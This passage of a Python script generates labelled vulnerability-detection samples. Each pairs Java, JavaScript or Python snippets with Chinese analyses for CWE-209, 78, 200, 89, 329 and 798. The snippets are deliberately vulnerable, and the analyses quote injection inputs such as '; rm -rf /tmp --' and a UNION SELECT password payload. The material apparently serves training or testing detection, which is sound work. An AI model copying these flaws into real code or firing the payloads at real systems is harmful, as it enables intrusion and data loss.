        throw new Exception("DB connection failed at jdbc:mysql://10.0.0.5:3306/orders");
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 12: id 来自 URL 路径参数，用户可控。\n"
        "2. line 17: 捕获异常后，将 e.getMessage() 和 e.getStackTrace() 返回给客户端。\n"
        "3. 错误消息包含内部数据库连接地址 jdbc:mysql://10.0.0.5:3306/orders，堆栈暴露类名和行号。\n"
        "4. 攻击者可利用泄露的内部 IP 和数据库地址进行进一步攻击。\n"
        "5. 归因为 CWE-209 而非 CWE-78：代码没有执行系统命令，loadOrder 抛出的异常被捕获后错误信息泄露给用户。\n"
        "6. 结论：CWE-209 Information Exposure Through Error Message，风险 Medium。",
        has_vuln=True, vuln_type="CWE-209 Information Exposure Through Error Message", risk="Medium",
        source_marker="catch (Exception e)",
        source_desc="异常处理捕获到包含内部细节的异常",
        sink_marker="Arrays.toString(e.getStackTrace())",
        sink_desc="ResponseEntity.body(...Arrays.toString(e.getStackTrace())) 将堆栈信息返回给用户",
        explanation="line 12 id 参数 -> line 19 loadOrder 抛出异常 -> line 17 catch 捕获 -> line 18-19 返回 e.getMessage() + 堆栈 -> 泄露内部 DB 地址 10.0.0.5:3306。归因 CWE-209 而非 CWE-78：无系统命令执行；漏洞是异常信息泄露",
        fix_marker="Arrays.toString(e.getStackTrace())",
        fix_desc="返回通用错误消息: return ResponseEntity.status(500).body('Internal server error')"))

    # CWE-78 OS Command Injection — same controller structure
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api/orders")
public class OrderController {

    @GetMapping("/{id}")
    public ResponseEntity<?> getOrder(@PathVariable String id) {
        try {
            Process p = Runtime.getRuntime().exec("cat /data/orders/" + id);
            String result = new String(p.getInputStream().readAllBytes());
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.status(500).body("Internal error");
        }
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 10: id 来自 URL 路径参数，用户可控。\n"
        "2. line 13: 将 id 拼接进 Runtime.exec 的命令字符串。\n"
        "3. line 13: Runtime.getRuntime().exec() 执行拼接后的系统命令。\n"
        "4. 攻击者传入 ../../etc/passwd 可读取任意文件，或用 ; 分隔符执行额外命令。\n"
        "5. 归因为 CWE-78 而非 CWE-209：异常处理返回的是通用消息，不泄露内部信息。真正的漏洞是命令拼接注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="@PathVariable String id",
        source_desc="getOrder(@PathVariable String id) 的 id 来自 URL 路径参数",
        sink_marker="Runtime.getRuntime().exec(",
        sink_desc="Runtime.getRuntime().exec('cat /data/orders/' + id) 执行拼接的系统命令",
        explanation="line 10 id -> line 13 拼接进 Runtime.exec 命令 -> 执行 -> 攻击者注入 ../../etc/passwd 读取任意文件。归因 CWE-78 而非 CWE-209：异常处理返回通用消息不泄露堆栈；漏洞是命令拼接注入",
        fix_marker="Runtime.getRuntime().exec(",
        fix_desc="使用 ProcessBuilder 列表参数且不拼接: new ProcessBuilder('cat', '/data/orders/' + validatedId).start()，并校验 id 为纯数字"))

    # --- Pair 3: JavaScript (Express debug endpoint vs SQL injection) ---
    # CWE-200 Information Exposure
    code = r'''const express = require('express');
const app = express();

app.get('/api/debug/status', (req, res) => {
    res.json({
        env: process.env,
        versions: process.versions,
        config: app.settings,
        memory: process.memoryUsage()
    });
});

app.listen(3000);
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 4: /api/debug/status 端点无认证即可访问。\n"
        "2. line 7: 将 process.env（包含所有环境变量）返回给客户端。\n"
        "3. process.env 可能包含 DATABASE_URL、API_KEY、JWT_SECRET 等敏感信息。\n"
        "4. 攻击者可直接获取这些密钥和凭证，用于后续攻击。\n"
        "5. 归因为 CWE-200 而非 CWE-89：代码中没有 SQL 查询，漏洞是调试端点暴露环境变量等敏感信息。\n"
        "6. 结论：CWE-200 Exposure of Sensitive Information，风险 High。",
        has_vuln=True, vuln_type="CWE-200 Exposure of Sensitive Information", risk="High",
        source_marker="/api/debug/status",
        source_desc="/api/debug/status 无认证调试端点",
        sink_marker="env: process.env",
        sink_desc="res.json({env: process.env}) 返回所有环境变量给用户",
        explanation="line 4 无认证调试端点 -> line 7 返回 process.env -> 泄露 DATABASE_URL/API_KEY/JWT_SECRET。归因 CWE-200 而非 CWE-89：无 SQL 查询；漏洞是调试端点暴露环境变量",
        fix_marker="env: process.env",
        fix_desc="移除调试端点，或添加认证并只返回非敏感信息: res.json({status: 'ok'})"))

    # CWE-89 SQL Injection — same endpoint structure
    code = r'''const express = require('express');
const mysql = require('mysql2');
const app = express();

const pool = mysql.createPool({host: 'localhost', user: 'root', database: 'appdb'});

app.get('/api/debug/status', (req, res) => {
    const name = req.query.name;
    const query = "SELECT * FROM config WHERE name = '" + name + "'";
    pool.query(query, (err, results) => {
        if (err) return res.status(500).json({error: 'DB error'});
        res.json({config: results});
    });
});

app.listen(3000);
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 8: req.query.name 获取用户可控参数。\n"
        "2. line 9: 将 name 字符串拼接进 SQL 查询语句。\n"
        "3. line 10: pool.query(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-200：异常处理返回通用 'DB error' 不泄露内部信息。真正的漏洞是 SQL 拼接注入。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="req.query.name",
        source_desc="req.query.name 用户可控参数",
        sink_marker="pool.query(query",
        sink_desc="pool.query(query) 执行字符串拼接的 SQL 语句",
        explanation="line 8 req.query.name -> line 9 拼接进 SQL -> line 10 pool.query 执行 -> 攻击者注入 ' UNION SELECT password FROM users--。归因 CWE-89 而非 CWE-200：异常返回通用消息不泄露内部信息；漏洞是 SQL 拼接注入",
        fix_marker="pool.query(query",
        fix_desc="使用参数化查询 pool.query('SELECT * FROM config WHERE name = ?', [name], callback)"))

    # --- Pair 4: Python (Django detailed error vs command injection) ---
    # CWE-209 Information Exposure
    code = r'''from django.http import HttpResponse
from django.views import View
import pymysql

class OrderView(View):
    def get(self, request, order_id):
        try:
            conn = pymysql.connect(host='10.0.0.5', user='app', password='s3cret', database='orders')
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM orders WHERE id = %s', (order_id,))
            order = cursor.fetchone()
            conn.close()
            return HttpResponse(str(order))
        except Exception as e:
            return HttpResponse(f"Error: {e}\nQuery failed for order {order_id}", status=500)
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: order_id 来自 URL 参数，用户可控。\n"
        "2. line 14: 捕获异常后，将 str(e)（包含数据库连接信息和错误详情）返回给客户端。\n"
        "3. 错误消息可能泄露数据库主机 IP (10.0.0.5)、用户名 (app)、数据库名 (orders) 等内部信息。\n"
        "4. 攻击者可利用这些信息进行进一步攻击。\n"
        "5. 归因为 CWE-209 而非 CWE-78：代码没有执行系统命令，SQL 查询也使用了参数化。漏洞是错误消息泄露内部信息。\n"
        "6. 结论：CWE-209 Information Exposure Through Error Message，风险 Medium。",
        has_vuln=True, vuln_type="CWE-209 Information Exposure Through Error Message", risk="Medium",
        source_marker="except Exception as e",
        source_desc="异常处理捕获到包含内部信息的异常",
        sink_marker='return HttpResponse(f"Error: {e}',
        sink_desc="HttpResponse(f'Error: {e}') 将异常详情返回给用户",
        explanation="line 7 order_id -> 触发异常 -> line 14 catch 捕获 -> HttpResponse(f'Error: {e}') 返回异常详情 -> 泄露 DB 主机 IP/用户名/库名。归因 CWE-209 而非 CWE-78：无系统命令执行；漏洞是异常消息泄露内部信息",
        fix_marker='return HttpResponse(f"Error: {e}',
        fix_desc="返回通用错误消息: return HttpResponse('Internal server error', status=500)，将详细错误记录到日志"))

    # CWE-78 OS Command Injection — same view structure
    code = r'''from django.http import HttpResponse
from django.views import View
import subprocess

class OrderView(View):
    def get(self, request, order_id):
        try:
            result = subprocess.check_output(f'cat /data/orders/{order_id}', shell=True)
            return HttpResponse(result)
        except Exception:
            return HttpResponse('Internal error', status=500)
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: order_id 来自 URL 参数，用户可控。\n"
        "2. line 10: 将 order_id 通过 f-string 拼接进 shell 命令，shell=True。\n"
        "3. line 10: subprocess.check_output 执行拼接后的 shell 命令。\n"
        "4. 攻击者传入 ; rm -rf /tmp -- 可执行任意命令。\n"
        "5. 归因为 CWE-78 而非 CWE-209：异常处理返回通用 'Internal error' 不泄露内部信息。真正的漏洞是命令拼接注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="order_id):",
        source_desc="get(self, request, order_id) 的 order_id 来自 URL 参数",
        sink_marker="subprocess.check_output(",
        sink_desc="subprocess.check_output(f'cat /data/orders/{order_id}', shell=True) 执行拼接的命令",
        explanation="line 7 order_id -> line 10 f-string 拼接进 shell 命令 shell=True -> 攻击者注入 ; rm -rf /tmp -- 执行任意命令。归因 CWE-78 而非 CWE-209：异常返回通用消息不泄露信息；漏洞是命令拼接注入",
        fix_marker="subprocess.check_output(",
        fix_desc="使用列表参数 shell=False: subprocess.run(['cat', f'/data/orders/{validated_id}'], capture_output=True)，并校验 order_id 为纯数字"))

    # --- Pair 5: Java (Spring debug endpoint vs SQL injection) ---
    # CWE-200 Information Exposure
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.util.Map;

@RestController
@RequestMapping("/api/debug")
public class DebugController {

    @GetMapping("/env")
    public ResponseEntity<?> getEnv() {
        return ResponseEntity.ok(Map.of(
            "javaHome", System.getProperty("java.home"),
            "userDir", System.getProperty("user.dir"),
            "envVars", System.getenv(),
            "osName", System.getProperty("os.name")
        ));
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: /api/debug/env 端点无认证即可访问。\n"
        "2. line 15: System.getenv() 返回所有环境变量给客户端。\n"
        "3. 环境变量可能包含 DB_PASSWORD、AWS_SECRET_KEY、JWT_SECRET 等敏感凭证。\n"
        "4. 攻击者可直接获取这些密钥用于后续攻击。\n"
        "5. 归因为 CWE-200 而非 CWE-89：代码中没有 SQL 查询，漏洞是调试端点暴露系统环境变量等敏感信息。\n"
        "6. 结论：CWE-200 Exposure of Sensitive Information，风险 High。",
        has_vuln=True, vuln_type="CWE-200 Exposure of Sensitive Information", risk="High",
        source_marker='"/env")',
        source_desc="/api/debug/env 无认证调试端点",
        sink_marker="System.getenv()",
        sink_desc="ResponseEntity.ok(...System.getenv()) 返回所有环境变量给用户",
        explanation="line 11 无认证调试端点 -> line 15 System.getenv() 返回所有环境变量 -> 泄露 DB_PASSWORD/AWS_SECRET_KEY/JWT_SECRET。归因 CWE-200 而非 CWE-89：无 SQL 查询；漏洞是调试端点暴露环境变量",
        fix_marker="System.getenv()",
        fix_desc="移除调试端点或添加 @PreAuthorize('hasRole(ADMIN)') 认证，且不返回 System.getenv()"))

    # CWE-89 SQL Injection — same controller structure
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.sql.*;

@RestController
@RequestMapping("/api/debug")
public class DebugController {

    @GetMapping("/env")
    public ResponseEntity<?> getEnv(@RequestParam String name) {
        try {
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost/appdb", "root", "");
            Statement stmt = conn.createStatement();
            String query = "SELECT * FROM config WHERE name = '" + name + "'";
            ResultSet rs = stmt.executeQuery(query);
            rs.next();
            return ResponseEntity.ok(rs.getString("value"));
        } catch (Exception e) {
            return ResponseEntity.status(500).body("DB error");
        }
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 11: name 来自 @RequestParam，用户可控。\n"
        "2. line 18: 将 name 拼接进 SQL 查询语句。\n"
        "3. line 19: stmt.executeQuery(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-200：异常处理返回通用 'DB error' 不泄露环境变量。真正的漏洞是 SQL 拼接注入。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="@RequestParam String name",
        source_desc="getEnv(@RequestParam String name) 的 name 来自请求参数",
        sink_marker="stmt.executeQuery(query)",
        sink_desc="stmt.executeQuery(query) 执行字符串拼接的 SQL 语句",
        explanation="line 11 name -> line 18 拼接进 SQL -> line 19 stmt.executeQuery 执行 -> 攻击者注入 ' UNION SELECT password FROM users--。归因 CWE-89 而非 CWE-200：异常返回通用 'DB error' 不泄露环境变量；漏洞是 SQL 拼接注入",
        fix_marker="stmt.executeQuery(query)",
        fix_desc="使用 PreparedStatement: pstmt = conn.prepareStatement('SELECT * FROM config WHERE name = ?'); pstmt.setString(1, name)"))

    # --- Pair 6: JavaScript (Express error handler vs command injection) ---
    # CWE-209 Information Exposure
    code = r'''const express = require('express');
const app = express();

app.get('/api/files/:name', (req, res) => {
    try {
        const name = req.params.name;
        const data = readFile(name);
        res.json({content: data});
    } catch (err) {
        res.status(500).json({
            error: err.message,
            stack: err.stack,
            path: __filename
        });
    }
});

function readFile(name) { throw new Error('ENOENT: no such file /var/data/' + name); }
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 5: name 来自 URL 路径参数，用户可控。\n"
        "2. line 10: 捕获异常后，将 err.message、err.stack、__filename 返回给客户端。\n"
        "3. err.stack 包含完整的调用栈（文件路径、行号），__filename 暴露服务器文件系统路径。\n"
        "4. 攻击者可利用这些信息了解服务器目录结构和代码组织。\n"
        "5. 归因为 CWE-209 而非 CWE-78：代码没有执行系统命令，readFile 是模拟函数。漏洞是异常堆栈和文件路径泄露。\n"
        "6. 结论：CWE-209 Information Exposure Through Error Message，风险 Medium。",
        has_vuln=True, vuln_type="CWE-209 Information Exposure Through Error Message", risk="Medium",
        source_marker="catch (err)",
        source_desc="异常处理捕获到包含内部信息的异常",
        sink_marker="stack: err.stack",
        sink_desc="res.json({stack: err.stack, path: __filename}) 将堆栈和文件路径返回给用户",
        explanation="line 5 name -> readFile 抛出异常 -> line 10 catch 捕获 -> line 12 返回 err.stack + __filename -> 泄露文件路径/调用栈。归因 CWE-209 而非 CWE-78：无系统命令执行；漏洞是异常堆栈泄露",
        fix_marker="stack: err.stack",
        fix_desc="返回通用错误消息: res.status(500).json({error: 'Internal server error'})"))

    # CWE-78 OS Command Injection — same endpoint structure
    code = r'''const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/api/files/:name', (req, res) => {
    try {
        const name = req.params.name;
        exec('cat /var/data/' + name, (err, stdout, stderr) => {
            if (err) return res.status(500).json({error: 'Internal error'});
            res.json({content: stdout});
        });
    } catch (err) {
        res.status(500).json({error: 'Internal error'});
    }
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 6: name 来自 URL 路径参数，用户可控。\n"
        "2. line 8: 将 name 拼接进 shell 命令字符串。\n"
        "3. line 8: exec() 通过 shell 执行拼接后的命令。\n"
        "4. 攻击者传入 ; rm -rf /tmp -- 可执行任意命令。\n"
        "5. 归因为 CWE-78 而非 CWE-209：异常处理返回通用 'Internal error' 不泄露堆栈。真正的漏洞是命令拼接注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="req.params.name",
        source_desc="req.params.name 用户可控路径参数",
        sink_marker="exec('cat /var/data/'",
        sink_desc="exec('cat /var/data/' + name) 通过 shell 执行拼接的命令",
        explanation="line 6 name -> line 8 拼接进 shell 命令 -> exec 执行 -> 攻击者注入 ; rm -rf /tmp -- 执行任意命令。归因 CWE-78 而非 CWE-209：异常返回通用消息不泄露堆栈；漏洞是命令拼接注入",
        fix_marker="exec('cat /var/data/'",
        fix_desc="使用 execFile 列表参数: const { execFile } = require('child_process'); execFile('cat', ['/var/data/' + validatedName], callback)"))

    return S


# ===========================================================================
# Group 3: CWE-329 (IV 不随机) vs CWE-798 (硬编码凭证) — 10 条 (5 对)
# ===========================================================================
def gen_cwe329_vs_cwe798():
    S = []

    # --- Pair 1: Python (AES hardcoded IV vs hardcoded API key) ---
    # CWE-329
    code = r'''from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'SixteenByteKey!!'
IV = b'FixedIV123456789'

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return IV.hex() + ct.hex()

def decrypt(ciphertext_hex):
    iv = bytes.fromhex(ciphertext_hex[:32])
    ct = bytes.fromhex(ciphertext_hex[32:])
    cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 5: IV 被硬编码为 b'FixedIV123456789'，每次加密都使用同一个 IV。\n"
        "2. line 8: AES.new 使用固定 IV 创建加密器。\n"
        "3. line 9: 相同明文每次加密产生相同密文，攻击者可检测密文模式推断明文关系。\n"
        "4. 固定 IV 导致 CBC 模式失去语义安全性，相同前缀的明文产生相同前缀的密文。\n"
        "5. 归因为 CWE-329 而非 CWE-798：密钥 KEY 虽然也是硬编码，但本样本核心问题是 IV 不随机导致密文可被分析。密钥硬编码是次要问题。\n"
        "6. 结论：CWE-329 Not Using a Random IV，风险 Medium。",
        has_vuln=True, vuln_type="CWE-329 Not Using a Random IV", risk="Medium",
        source_marker="IV = b'FixedIV",
        source_desc="IV = b'FixedIV123456789' 硬编码固定 IV",
        sink_marker="AES.new(KEY, AES.MODE_CBC, iv=IV)",
        sink_desc="AES.new(KEY, AES.MODE_CBC, iv=IV) 使用固定 IV 加密",
        explanation="line 5 IV 硬编码为固定值 -> line 8 AES.new(iv=IV) 每次使用相同 IV -> 相同明文产生相同密文前缀 -> 密文模式可被分析。归因 CWE-329 而非 CWE-798：核心问题是 IV 不随机导致密文可被分析，而非密钥硬编码",
        fix_marker="IV = b'FixedIV",
        fix_desc="每次加密生成随机 IV: iv = os.urandom(16); cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)"))

    # CWE-798
    code = r'''import requests

API_URL = 'https://api.payment.com/v1/charge'
API_KEY = 'sk_live_51234567890abcdef'

def charge_card(amount, currency, card_token):
    headers = {'Authorization': f'Bearer {API_KEY}'}
    payload = {'amount': amount, 'currency': currency, 'source': card_token}
    resp = requests.post(API_URL, json=payload, headers=headers)
    return resp.json()
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 4: API_KEY 硬编码为 'sk_live_51234567890abcdef'，直接写在源码中。\n"
        "2. line 8: 硬编码的 API_KEY 用于支付接口的 Authorization 头。\n"
        "3. 源码泄露（如 Git 仓库公开）会导致支付 API 密钥泄露，攻击者可发起任意支付。\n"
        "4. 密钥无法轮换（需改代码重新部署），且出现在版本历史中。\n"
        "5. 归因为 CWE-798 而非 CWE-329：本代码没有加密操作，不存在 IV 问题。核心问题是 API 密钥硬编码在源码中。\n"
        "6. 结论：CWE-798 Use of Hard-coded Credentials，风险 Critical。",
        has_vuln=True, vuln_type="CWE-798 Use of Hard-coded Credentials", risk="Critical",
        source_marker="API_KEY = 'sk_live_",
        source_desc="API_KEY = 'sk_live_51234567890abcdef' 硬编码支付 API 密钥",
        sink_marker="headers = {'Authorization'",
        sink_desc="headers = {'Authorization': f'Bearer {API_KEY}'} 使用硬编码密钥请求支付 API",
        explanation="line 4 API_KEY 硬编码 -> line 8 用于 Authorization 头 -> 源码泄露导致支付密钥泄露 -> 攻击者可发起任意支付。归因 CWE-798 而非 CWE-329：无加密操作无 IV 问题；核心问题是 API 密钥硬编码在源码",
        fix_marker="API_KEY = 'sk_live_",
        fix_desc="从环境变量获取: API_KEY = os.environ['PAYMENT_API_KEY']，或使用密钥管理服务如 AWS Secrets Manager"))

    # --- Pair 2: Java (AES fixed IV vs hardcoded DB password) ---
    # CWE-329
    code = r'''import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class CryptoUtil {
    private static final byte[] KEY = "SixteenByteKey!!".getBytes();
    private static final byte[] IV = "StaticIV12345678".getBytes();

    public static String encrypt(String plaintext) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE,
            new SecretKeySpec(KEY, "AES"),
            new IvParameterSpec(IV));
        return Base64.getEncoder().encodeToString(cipher.doFinal(plaintext.getBytes()));
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 9: IV 硬编码为 'StaticIV12345678'.getBytes()，固定不变。\n"
        "2. line 14: new IvParameterSpec(IV) 使用固定 IV 初始化加密器。\n"
        "3. 固定 IV 导致相同明文产生相同密文，可被频率分析攻击。\n"
        "4. CBC 模式要求 IV 不可预测，固定 IV 使其退化为 ECB 的安全性。\n"
        "5. 归因为 CWE-329 而非 CWE-798：密钥 KEY 虽然也硬编码，但核心问题是 IV 不随机导致加密语义安全性丧失。\n"
        "6. 结论：CWE-329 Not Using a Random IV，风险 Medium。",
        has_vuln=True, vuln_type="CWE-329 Not Using a Random IV", risk="Medium",
        source_marker='IV = "StaticIV',
        source_desc="IV = 'StaticIV12345678'.getBytes() 硬编码固定 IV",
        sink_marker="new IvParameterSpec(IV)",
        sink_desc="new IvParameterSpec(IV) 使用固定 IV 初始化 AES 加密",
        explanation="line 9 IV 硬编码 -> line 14 IvParameterSpec(IV) 使用固定 IV -> 相同明文产生相同密文 -> 密文可被频率分析。归因 CWE-329 而非 CWE-798：核心问题是 IV 不随机，密钥硬编码是次要问题",
        fix_marker='IV = "StaticIV',
        fix_desc="每次加密生成随机 IV: byte[] iv = new byte[16]; new SecureRandom().nextBytes(iv); new IvParameterSpec(iv)"))

    # CWE-798
    code = r'''import java.sql.*;

public class DatabaseUtil {
    private static final String DB_URL = "jdbc:mysql://10.0.0.5:3306/appdb";
    private static final String DB_USER = "appuser";
    private static final String DB_PASS = "P@ssw0rd!2024";

    public static Connection getConnection() throws SQLException {
        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
    }

    public static String queryUser(String id) throws SQLException {
        Connection conn = getConnection();
        PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
        ps.setString(1, id);
        ResultSet rs = ps.executeQuery();
        return rs.next() ? rs.getString("username") : null;
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 6: DB_PASS 硬编码为 'P@ssw0rd!2024'，直接写在源码中。\n"
        "2. line 9: DriverManager.getConnection 使用硬编码的密码连接数据库。\n"
        "3. 源码泄露会导致数据库凭证泄露，攻击者可直接访问数据库。\n"
        "4. 密码出现在版本历史中，即使后续修改也留有痕迹。\n"
        "5. 归因为 CWE-798 而非 CWE-329：本代码没有加密操作，不存在 IV 问题。核心问题是数据库密码硬编码在源码中。\n"
        "6. 结论：CWE-798 Use of Hard-coded Credentials，风险 High。",
        has_vuln=True, vuln_type="CWE-798 Use of Hard-coded Credentials", risk="High",
        source_marker='DB_PASS = "P@ssw0rd',
        source_desc='DB_PASS = "P@ssw0rd!2024" 硬编码数据库密码',
        sink_marker="DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)",
        sink_desc="DriverManager.getConnection 使用硬编码密码连接数据库",
        explanation="line 6 DB_PASS 硬编码 -> line 9 DriverManager.getConnection 使用硬编码密码 -> 源码泄露导致 DB 凭证泄露 -> 攻击者可直接访问数据库。归因 CWE-798 而非 CWE-329：无加密操作无 IV 问题；核心问题是密码硬编码",
        fix_marker='DB_PASS = "P@ssw0rd',
        fix_desc="从环境变量获取: String dbPass = System.getenv('DB_PASSWORD'); 或使用 JNDI/JDBC 连接池配置外部化"))

    # --- Pair 3: JavaScript (AES fixed IV vs hardcoded JWT secret) ---
    # CWE-329
    code = r'''const crypto = require('crypto');

const KEY = Buffer.from('SixteenByteKey!!', 'utf8');
const IV = Buffer.from('FixedIV12345678', 'utf8');

function encrypt(text) {
    const cipher = crypto.createCipheriv('aes-128-cbc', KEY, IV);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return IV.toString('hex') + encrypted;
}
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 4: IV 硬编码为 'FixedIV12345678'，固定不变。\n"
        "2. line 7: crypto.createCipheriv 使用固定 IV 创建加密器。\n"
        "3. 固定 IV 导致相同明文产生相同密文，可被密文模式分析。\n"
        "4. CBC 模式要求 IV 不可预测，固定 IV 削弱了语义安全性。\n"
        "5. 归因为 CWE-329 而非 CWE-798：KEY 虽然也硬编码，但核心问题是 IV 不随机导致加密可被分析。\n"
        "6. 结论：CWE-329 Not Using a Random IV，风险 Medium。",
        has_vuln=True, vuln_type="CWE-329 Not Using a Random IV", risk="Medium",
        source_marker="IV = Buffer.from('FixedIV",
        source_desc="IV = Buffer.from('FixedIV12345678') 硬编码固定 IV",
        sink_marker="crypto.createCipheriv(",
        sink_desc="crypto.createCipheriv('aes-128-cbc', KEY, IV) 使用固定 IV 加密",
        explanation="line 4 IV 硬编码 -> line 7 createCipheriv 使用固定 IV -> 相同明文产生相同密文 -> 密文可被模式分析。归因 CWE-329 而非 CWE-798：核心问题是 IV 不随机，密钥硬编码是次要问题",
        fix_marker="IV = Buffer.from('FixedIV",
        fix_desc="每次加密生成随机 IV: const iv = crypto.randomBytes(16); crypto.createCipheriv('aes-128-cbc', KEY, iv)"))

    # CWE-798
    code = r'''const jwt = require('jsonwebtoken');

const SECRET_KEY = 'my-super-secret-key-2024';

function generateToken(user) {
    return jwt.sign({userId: user.id, role: user.role}, SECRET_KEY, {expiresIn: '1h'});
}

function verifyToken(token) {
    return jwt.verify(token, SECRET_KEY);
}

module.exports = {generateToken, verifyToken};
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 3: SECRET_KEY 硬编码为 'my-super-secret-key-2024'，直接写在源码中。\n"
        "2. line 6: jwt.sign 使用硬编码的密钥签发 JWT。\n"
        "3. 源码泄露会导致 JWT 签名密钥泄露，攻击者可伪造任意用户/角色的 JWT。\n"
        "4. 密钥无法轮换（需改代码重新部署），且出现在 Git 版本历史中。\n"
        "5. 归因为 CWE-798 而非 CWE-329：本代码没有加密操作，不存在 IV 问题。核心问题是 JWT 签名密钥硬编码。\n"
        "6. 结论：CWE-798 Use of Hard-coded Credentials，风险 Critical。",
        has_vuln=True, vuln_type="CWE-798 Use of Hard-coded Credentials", risk="Critical",
        source_marker="SECRET_KEY = 'my-super",
        source_desc="SECRET_KEY = 'my-super-secret-key-2024' 硬编码 JWT 签名密钥",
        sink_marker="jwt.sign(",
        sink_desc="jwt.sign(payload, SECRET_KEY) 使用硬编码密钥签发 JWT",
        explanation="line 3 SECRET_KEY 硬编码 -> line 6 jwt.sign 使用硬编码密钥 -> 源码泄露导致密钥泄露 -> 攻击者可伪造任意 JWT。归因 CWE-798 而非 CWE-329：无加密操作无 IV 问题；核心问题是 JWT 密钥硬编码",
        fix_marker="SECRET_KEY = 'my-super",
        fix_desc="从环境变量获取: const SECRET_KEY = process.env.JWT_SECRET"))

    # --- Pair 4: Python (AES-CBC static IV vs hardcoded encryption key) ---
    # CWE-329
    code = r'''from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

STATIC_IV = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'

def encrypt_data(key, plaintext):
    cipher = Cipher(algorithms.AES(key), modes.CBC(STATIC_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    import padding
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    return encryptor.update(padded) + encryptor.finalize()
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 5: STATIC_IV 硬编码为固定字节序列，每次加密都使用同一个 IV。\n"
        "2. line 8: modes.CBC(STATIC_IV) 使用固定 IV 初始化 CBC 模式。\n"
        "3. 固定 IV 导致相同明文产生相同密文前缀，可被密文分析攻击。\n"
        "4. CBC 要求 IV 不可预测，静态 IV 使加密失去语义安全性。\n"
        "5. 归因为 CWE-329 而非 CWE-798：密钥通过参数传入（非硬编码），核心问题是 IV 静态不随机。\n"
        "6. 结论：CWE-329 Not Using a Random IV，风险 Medium。",
        has_vuln=True, vuln_type="CWE-329 Not Using a Random IV", risk="Medium",
        source_marker="STATIC_IV = b'\\x01",
        source_desc="STATIC_IV = b'\\x01\\x02...' 硬编码固定 IV 字节序列",
        sink_marker="modes.CBC(STATIC_IV)",
        sink_desc="modes.CBC(STATIC_IV) 使用固定 IV 初始化 CBC 加密模式",
        explanation="line 5 STATIC_IV 硬编码 -> line 8 modes.CBC(STATIC_IV) 使用固定 IV -> 相同明文产生相同密文 -> 可被密文分析。归因 CWE-329 而非 CWE-798：密钥通过参数传入非硬编码；核心问题是 IV 静态不随机",
        fix_marker="modes.CBC(STATIC_IV)",
        fix_desc="每次加密生成随机 IV: iv = os.urandom(16); modes.CBC(iv)"))

    # CWE-798
    code = r'''from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

ENCRYPTION_KEY = b'ThisIsAHardcodedEncryptionKey32!'

def encrypt_data(plaintext):
    iv = os.urandom(16)
